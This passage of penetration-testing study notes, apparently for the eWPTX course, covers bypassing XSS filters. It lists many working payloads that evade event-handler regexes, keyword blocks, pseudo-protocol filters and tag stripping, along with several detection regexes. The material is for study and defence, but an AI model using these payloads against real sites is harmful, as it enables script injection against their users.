+</code></pre><ul id="fc730afc-a15b-4ffa-8faa-5dda7c525498" class="bulleted-list"><li style="list-style-type:disc">From a defensive point of view, the solution is to filter all the events that start with <strong>on</strong> in order to block this injection point.</li></ul><p id="a4207c0f-0fc1-4267-95ce-2f6171fffb67" class="">This is a very common regex you might find used widely:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b2898533-6732-47ec-992f-6ecf38221b6e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">(on\w+\s*=)
+
+# We can bypass this filter:
+&lt;svg/onload=alert(1)&gt;
+&lt;svg//////onload=alert(1)&gt;
+&lt;svg id=x; onload=alert(1)&gt;
+&lt;svg id=&#x27;x&#x27; onload=alert(1)&gt;
+</code></pre><p id="256d84d5-01db-4e50-ae46-296b91cd125a" class="">So, we have an <strong>Upgrade</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="43828cb8-5612-4448-9467-47a27f743186" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">(?i)([\s\&quot;&#x27;`;\/0-9\=]+on\w+\s*=)
+</code></pre><ul id="3631f9ac-f48e-4b44-8de4-9d8eb41e0684" class="bulleted-list"><li style="list-style-type:disc">However, Some browsers convert the control character to a space, thus the \s meta-character is not enough to cover all possible chars.</li></ul><p id="ff9441e3-8004-41b9-8b42-5b09255b8e5f" class="">We can bypass that too:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c990b061-80ac-4284-94d8-2e322a98db1a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;svg onload%09=alert(1)&gt; # Works in all browsers except Safari
+&lt;svg %09onload=alert(1)&gt;
+&lt;svg %09onload%20=alert(1)&gt;
+&lt;svg onload%09%20%28%2C%3B=alert(1)&gt;
+&lt;svg onload%0B=alert(1)&gt;  # IE only
+</code></pre><p id="9bffe2da-71d2-4d82-98d6-7b1e22f2cb66" class="">Browsers are in continuous evolution; Therefore, some of the chars allowed may not work anymore. So, Shazzer Fuzz DB has created two fuzzer tests:</p><p id="3642002b-3551-4532-86cc-204f7b9f5a86" class="">→ http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name</p><p id="46ebfbea-4f18-4ed8-8efd-448d1731b7ba" class="">→ http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name</p><p id="5e3e90ef-acd1-49a1-910f-3ce93558f693" class="">To data, a valid regex rule should be the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c1ffc0ea-2479-4540-9017-050b2e06880a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">(?i)([\s\&quot;&#x27;`;\/0-9\=\x00\x09\x0A\x0C\0x0D\x3B\x2C\x28\x3B]+on\w+[\s\x00\x09\x0A\x0C\0x0D\x3B\x2C\x28\x3B]*?=)
+</code></pre><h2 id="0eb684a9-fb91-4a66-9268-4ee6af8c6180" class=""><strong>Keyword Based Filters</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#keyword-based-filters"></a></strong></h2><p id="70433758-50ed-4718-a731-c53f2a165175" class="">There are filters focused on preventing scripting mode such as <strong>alert, javascript, eval</strong></p><h3 id="2add639e-5c0c-474c-a391-65af6aac42a3" class=""><strong>Char Escaping</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#char-escaping"></a></strong></h3><p id="cee601b0-d567-4df2-81da-60836a486d8d" class="">Here we see Unicode Escaping without using native functions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="578a8ca6-dfb4-42fa-87af-4e72efaec3bc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;\u0061lert(1)&lt;/script&gt;
+&lt;script&gt;\u0061\u006\u0065\u0072\u0074(1)&lt;/script&gt;
+</code></pre><p id="fd289228-0bdb-4f56-b9da-fbfddef43023" class="">Unicode escaping using native functions. Eval is just one of many:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6db4655b-787d-4857-869b-f35fba333517" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;eval(&quot;\u0061lert(1)&quot;)&lt;/script&gt;
+&lt;script&gt;eval(&quot;\u0061\u006\u0065\u0072\u0074\u0028\u0031\u0029&quot;)&lt;/script&gt;
+</code></pre><p id="9fd8af91-5c1a-4094-9653-4bba4ff11a72" class="">IF the filtered vector is within a string, in addition to Unicode, there are multiple escapses we may adopt:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="77ff7034-d07d-4a4f-b287-451c45ace3b5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=&quot;\u0061lert(1)&quot;/&gt;
+&lt;img src=x onerror=&quot;eval(&#x27;\141lert(1)&#x27;)&quot;/&gt;     # octal escape
+&lt;img src=x onerror=&quot;eval(&#x27;\x61lert(1)&#x27;)&quot;/&gt;     # hexa escape
+
+&lt;img src=x onerror=&quot;eval(&#x27;&amp;#x0061;lert(1)&#x27;)&quot;/&gt; # hexa numeric char reference
+&lt;img src=x onerror=&quot;eval(&#x27;&amp;#97;lert(1)&#x27;)&quot;/&gt;    # decimal NCR
+&lt;img src=x onerror=&quot;eval(&#x27;\a\l\ert(1\)&#x27;)&quot;/&gt;    # superfluous escapes chars
+
+&lt;img src=x onerror=&quot;eval(&#x27;\u0065val(&#x27;\141\u006c&amp;#101;&amp;#x0072t\(&amp;#49)&#x27;)&quot;/&gt;  &#x27;
+# All chars escaping can stay together.
+</code></pre><h3 id="d1453567-b20f-4622-b71b-ffb06caa5d8a" class=""><strong>Contructing String</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#contructing-string"></a></strong></h3><p id="b2d4ebf1-cc6e-43c6-8fd6-7f52e746ec0c" class="">Javascript jas several functions useful to create string:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f49f290e-0b89-4a03-bf8d-86e9f5a9e4f0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/ale/.source+/rt/.source
+String.fromCharCode(97,108,101,114,116)
+atob(&quot;YWxlcnQ=&quot;)
+177985081..toString(36)
+</code></pre><h3 id="40afcc74-29cb-426d-8092-8d111d4eec90" class=""><strong>Execution Sinks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#execution-sinks"></a></strong></h3><ul id="ab7c27a5-7ab3-4936-8f46-eb67a578c320" class="bulleted-list"><li style="list-style-type:disc">Technically, functions that parse string as JavaScript code are called execution sinks, and JavaScript offers several alternatives.</li></ul><p id="91c44f69-ad05-4e29-8a53-2923ba64a6b9" class="">Some Sinks:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a43ee14f-9011-4987-988c-36b8c831c070" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">setTimeout(&quot;JSCode&quot;) //all browsers
+setInterval(&quot;JSCode&quot;) //all browsers
+setImmediate(&quot;JSCode&quot;) //IE 10+
+Function(&quot;JSCode&quot;) //all browsers
+
+# moreover: https://code.google.com/p/domxsswiki/wiki/ExecutionSinks
+</code></pre><p id="34875935-71f0-490e-85cc-7f399f0f4224" class="">Variation of the Function sink:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bb1c1d89-c283-462c-b56d-eb612564004b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[].constructor.constructor(alert(1))
+</code></pre><table id="3401f4b7-e1ab-4454-9efd-b2464941b30c" class="simple-table"><tbody><tr id="16964874-1516-498f-9122-eba95c465115"><td id=";{Bw" class="">object</td><td id="UG}e" class="">array</td><td id="wSvo" class="">function</td><td id="IgFH" class="">XSS vector</td></tr></tbody></table><h3 id="680b39db-b200-4bc7-adf4-3ff069fdf5e0" class=""><strong>Pseudo-protocols</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#pseudo-protocols"></a></strong></h3><p id="08cf5d25-e604-41e8-8a48-b350e619f0c6" class=""><strong>javascript:</strong> is an unofficional URI scheme, commonly referred as a pseudo-protocol.</p><ul id="decc5926-089f-436d-b4a3-d5f3ea398529" class="bulleted-list"><li style="list-style-type:disc">javascript followerd by (:) is usually blocked</li></ul><p id="7d6bcc4e-07bf-47fa-8082-194073fea8c8" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cc95e0fc-8ae7-49a3-80ae-492046277c93" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;a href=&quot;javascript:alert(1)&quot;/&gt;    &quot; //blocked
+# javascript: is not needed on event handlers; SO, we should avoid using it.
+</code></pre><p id="65728a87-1771-4720-9a3f-1ad3d4815c9e" class="">Bypass examples:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29ea599d-f576-4840-be17-4bcfed84119d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;object data=&quot;JaVScRiPt:alert(1)&quot;&gt;
+&lt;object data=&quot;javascript&amp;colon;:alert(1)&quot;&gt;
+&lt;object data=&quot;java
+script:alert(1)&quot;&gt;
+&lt;object data=&quot;javascript&amp;#x003A;alert(1)&quot;&gt;
+&lt;object data=&quot;javascript&amp;#58;alert(1)&quot;&gt;
+&lt;object data=&quot;&amp;#x6A;avascript:alert(1)&quot;&gt;
+&lt;object data=&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;alert(1)&quot;&gt;
+</code></pre><ul id="614ffc21-90a9-414b-83c5-d98a473e9450" class="bulleted-list"><li style="list-style-type:disc">In addition to <strong>javascript:</strong>, there are also <strong>data:</strong> and the IE exclusive <strong>vbscript:</strong></li></ul><p id="956bee4b-7532-4603-a9d6-ef2eaccb492c" class="">Data URI scheme:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d54e620c-1a7c-4f43-a5da-c51b5e897a26" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;
+
+# mediatype is usually &#x27;text/html&#x27;
+</code></pre><p id="b5fd8ba1-4eb3-4339-afa3-9dda298904d8" class="">If <strong>javascript:</strong> is blocked:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ec3ed303-b872-4731-9c10-9dd74aeaa494" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;object data=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+&lt;object data=&quot;data:text/html,base64,&lt;base64 encoded&gt;&quot;&gt;
+</code></pre><p id="0207ac84-36bd-4a23-8dfa-bc461f9994e3" class="">If <strong>data:</strong> is blocked:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8b4318ee-24c2-490c-998d-1878aad9889a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;embed code=&quot;DaTa:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+&lt;embed code=&quot;data&amp;colon;text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+&lt;embed code=&quot;data&amp;#x003A;text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+&lt;embed code=&quot;&amp;#x64;&amp;#x61;ta:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
+</code></pre><p id="d9dc6dd6-d0d2-4c2e-b00e-4fdd45627bba" class="">The <strong>vbscript</strong> pseudo-protocol is not so common, because it can only be used with IE.</p><ul id="4c8212d3-0509-48a1-95ed-e76d13a64b59" class="bulleted-list"><li style="list-style-type:disc">From IE11 in Edge, vbscript is no longer supported.</li></ul><p id="159a38fe-c43f-421a-b0da-e54f28e90376" class="">How to use vbscript:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b3c9fbbf-69fc-4ddb-b947-0c8186cd7cd8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;img src=a onerror=&quot;vbscript:msgbox 1&quot;/&gt; //works till IE8
+&lt;img src=b onerror=&quot;vbs:msgbox 2&quot;/&gt; //works till IE8
+&lt;img src=c onerror=&quot;vbs:alert(3)&quot;/&gt;   &quot;//works till IE Edge
+&lt;img src=d onerror=&quot;vbscript:alert(4)&quot;/&gt;  &quot;//works till IE Edge
+</code></pre><p id="c3f556ef-3fa6-4f5e-9c80-1b98bceead4e" class="">Bypass vbscript:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4297aca6-c5f3-449b-a826-bd7dcb0c9069" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=&quot;vbscript&amp;#x003A;alert(1)&quot;/&gt;    &quot;
+&lt;img src=x onerror=&quot;vb&amp;#x63;cript:alert(1)&quot;/&gt;       &quot;
+
+&lt;img src=x onerror=&quot;v&amp;#00;bs&amp;#x00;cri pt:alert(1)&quot;/&gt; //using NUL bytes
+</code></pre><p id="ea831db7-db67-468b-b439-1a572d3e0371" class="">Tool to obfuscate:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="805939fe-50e8-4cf2-a0b8-958882b09b18" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://dennisbabkin.com/screnc/
+</code></pre><h2 id="aa0e8e10-12f4-4963-9ddd-96250e72f61b" class=""><strong>Bypassing Sanitization</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#bypassing-sanitization"></a></strong></h2><p id="f04143c6-b3cd-4a3d-9995-a27a758c877d" class="">The most common is to HTML-encode such as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a1860be0-c5ff-45e8-a905-0e902fabbd3c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt; (&amp;lt;)
+&gt; (&amp;gt;)
+</code></pre><h3 id="eaa8d51f-d9f2-4dbb-a5b2-61b3ca454101" class=""><strong>String Manipulations</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#string-manipulations"></a></strong></h3><p id="f929cf98-a7d4-49c6-b0d2-2d70fa056acb" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cb5e50e6-d0df-4f53-aab7-cae786e85462" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">removing &lt;script&gt; tag
+</code></pre><h3 id="5cbaa715-88b6-4609-8f30-d33f89c483c0" class=""><strong>Removing HTML tags</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xssfilter/#removing-html-tags"></a></strong></h3><p id="9219c1fe-e15a-47af-97ee-15b45b7bd468" class="">The check is not performed recursively:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="05d4131c-ea05-45bd-af2b-66efc42fa22c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; # this could be a bypass
+</code></pre><p id="dc05cb1a-01df-41cf-b5dc-4f248533e77d" class="">If the filter performs recursive checks, we can still bypass. maybe changing the order of injected strings.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9492a76b-849c-4778-8066-65f35ca15828" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;scr&lt;iframe&gt;ipt&gt;alert(1)&lt;/script&gt; //this could be a bypass
